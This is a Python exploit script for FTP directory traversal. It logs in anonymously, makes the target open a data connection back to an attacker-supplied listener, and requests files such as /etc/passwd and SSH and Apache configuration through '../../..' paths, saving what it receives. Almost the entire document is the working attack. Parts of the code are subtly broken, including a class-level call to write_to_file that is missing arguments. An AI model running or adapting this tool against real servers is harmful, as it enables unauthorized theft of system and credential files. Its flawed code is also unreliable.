#!/usr/bin/env python3
"""
FTP Directory Traversal module automating 
with a wordlist, the exploitation of :
    - LIST for file listing
    - RETR for file downloading
"""

__author__ = "Yacine Floret"
__version__ = "0.1.0"
__license__ = "MIT"

import argparse
import datetime
import os
import socket
import threading 
import logzero
from logzero import logger

RPORT = 21
LPORT = 1258

# Defaut Linux wordlist
DEFAULT_WORDLIST = [
    "/etc/passwd", 
    "/var/log/apache2/access.log", 
    "/etc/ssh/sshd_config",
    "/etc/init.d/uftp", 
    "/etc/lighttpd/conf-enabled/10-rewrite.conf",
    "/etc/apache/conf/httpd.conf",
    "/etc/apache2/sites-enabled/000-default",
    "/etc/apache2/sites-enabled/000-default.conf",
    "/etc/apache2/sites-enabled/default",
    "/etc/apache2/sites-enabled/default.conf",
    "/etc/ssh/sshd_config",
    "/etc/ssh/ssh_config"
]
class ThreadedServer(threading.Thread):

    def __init__(self, host="0.0.0.0", port=1258):
        super(ThreadedServer, self).__init__()
        self.filename = "unknown"
        self.stop = False
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def set_filename(self, filename):
        self.filename = filename

    def stop_thread(self):
        self.stop = True

    def run(self):
        self.listen()

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()
            if self.stop == True:
                break

    def listenToClient(self, client, address):
        size = 8000
        while True:
            try:
                data = client.recv(size)
                if data:
                    logger.info(f"[***] Data received : {data}")
                    ThreadedServer.write_to_file(data)
                else:
                    logger.error("No data obtained")
                    raise Exception('Client disconnected')
            except Exception as e:
                logger.error("Error while receiving data from the target")
                logger.exception(e)
                client.close()
                return False

    def write_to_file(self, data, action="file"):
        logger.info(
            f"Saving {self.filename} {action} in "
            f"{os.getcwd()} (size : {len(data)})"
            )
        generate_datetime_file(action, data)
        with open(self.filename, "wb") as f:
            f.write(data)


def generate_datetime_file(action, line):
    now = datetime.datetime.now()
    # Generate date string to sort files in file explorer
    time_creation = now.strftime("%-M%-H-%-m%-d%Y")
    # Filename format : "3020-12242023_file_etc_passwd.out"
    custom_filename = (f"{time_creation}_{action}"
                      f"_{line.replace('/', '_')}.out")
    return custom_filename
    
def send_comands(rhost, commands):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10.0)
    sock.connect((rhost, RPORT))
    sock.recv(1000)
    if type(commands) is list:
        for command in commands:
            logger.info(f"[*] Running command {command}")
            sock.send(command.encode("utf8"))
            response = sock.recv(1000)
            logger.debug(response)
    logger.info("Closing connection...")
    sock.close()
    return response.strip()



def main(args):
    logger.debug(args)
    ts = ThreadedServer(host=args.lhost)
    ts.start()
    action = args.action
    basic_commands = [
        "USER anonymous",
        "PASS pass",
        f"PORT {args.lhost.replace('.', ',')},0,{LPORT}"
    ]

    if args.wordlist:
        with open(args.wordlist, "r") as f:
            lines = [l.strip() for l in f.readlines()]
    else:
        lines = DEFAULT_WORDLIST

    ftp_command = {"list": "LIST", "download": "RETR"}

    for line in lines:
        logger.info(f"Sending file path {line} for {action}")
        custom_filename = generate_datetime_file(action, line)
        ts.set_filename(custom_filename)
        retr_file = f"{ftp_command[action]} ../../..{line}"
        full_commands = basic_commands + [retr_file]
        send_comands(args.rhost, full_commands)

    ts.stop_thread()
    ts.join()


if __name__ == "__main__":
    """ This is executed when run from the command line """
    logzero.logfile(f"{os.path.dirname(__file__)}/ftp_traversal.log")
    logzero.loglevel(logzero.INFO)
    parser = argparse.ArgumentParser()

    # Required positional argument
    parser.add_argument("action", help="FTP command to perform (list or download)")
    parser.add_argument("wordlist",  nargs='?', help="Wordlist path")
    parser.add_argument("-w", "--wordlist", action="store", dest="wordlist")
    parser.add_argument("-r", "--rhost", action="store", dest="rhost", required=True)
    parser.add_argument("-l", "--lhost", action="store", dest="lhost", required=True)

    # Optional verbosity counter (eg. -v, -vv, -vvv, etc.)
    parser.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Verbosity (-v, -vv, etc)")

    # Specify output of "--version"
    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s (version {version})".format(version=__version__))

    args = parser.parse_args()
    main(args)

